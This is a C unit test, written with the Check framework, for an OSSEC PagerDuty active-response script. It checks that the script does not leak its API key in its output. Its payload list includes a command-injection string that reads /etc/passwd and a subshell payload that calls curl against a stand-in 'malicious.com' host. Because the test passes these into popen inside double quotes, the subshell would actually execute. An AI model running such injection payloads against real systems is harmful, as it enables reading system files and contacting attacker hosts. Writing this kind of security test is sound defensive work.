#include <check.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

START_TEST(test_api_key_not_exposed)
{
    // Invariant: Script execution must not expose API key in process list or output
    const char *payloads[] = {
        "delete",  // Valid input that should exit early
        "test; cat /etc/passwd",  // Adversarial input with command injection attempt
        "alert '$(curl http://malicious.com)'",  // Adversarial input with subshell attempt
        "normal_alert_arg"  // Normal alert input
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        char command[512];
        snprintf(command, sizeof(command), 
                 "cd .. && ./active-response/ossec-pagerduty.sh \"%s\" arg2 arg3 alert123 456", 
                 payloads[i]);
        
        // Execute script and capture output
        FILE *fp = popen(command, "r");
        ck_assert_ptr_nonnull(fp);
        
        char buffer[1024];
        int api_key_found = 0;
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            // Check if API key placeholder or any key-like pattern appears in output
            if (strstr(buffer, "xxxxxxx") != NULL || 
                strstr(buffer, "api_key") != NULL ||
                strstr(buffer, "APIKEY") != NULL) {
                api_key_found = 1;
                break;
            }
        }
        
        int status = pclose(fp);
        
        // Property: API key must not appear in script output
        ck_assert_int_eq(api_key_found, 0);
        
        // Property: Script must handle all inputs without crashing
        ck_assert(WIFEXITED(status));
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_api_key_not_exposed);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}